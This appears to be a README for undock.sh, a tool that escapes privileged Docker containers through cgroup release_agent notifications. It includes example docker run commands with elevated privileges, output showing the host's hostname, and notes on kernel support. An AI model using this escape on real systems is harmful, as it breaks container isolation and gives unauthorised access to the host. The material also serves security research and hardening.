A method of breaking out a privileged container using cgroups release notifications. The original author is @_fel1x (Felix Wilhelm) in a tweet https://twitter.com/_fel1x/status/1151487051986087936. After that Dominik Czar improved it to need fewer privileges https://blog.trailofbits.com/2019/07/19/understanding-docker-container-escapes/

An example:
```
docker run -it --rm --privileged alpine sh
/ # ./undock.sh hostname
master
```

Or with less privs:
```
docker run --rm -it --cap-add=SYS_ADMIN --volume /root:/host --security-opt apparmor=unconfined ubuntu bash
root@387c0166606d:/# ./undock.sh hostname
mkdir: cannot create directory '/sys/fs/cgroup/rdma/w': Read-only file system
Read-only file system maybe? Let's mount a writable one.
master
```

More info on how cgroup release notifications work at http://man7.org/linux/man-pages/man7/cgroups.7.html

It requires at least one cgroup with a release_agent (typically rdma). In my limited testing, linux kernel 4.9 (docker-ce) didn't have it, neither did 4.15 in an old VM, but 4.14 in my own linuxkit and 4.19 on an updated kali did.

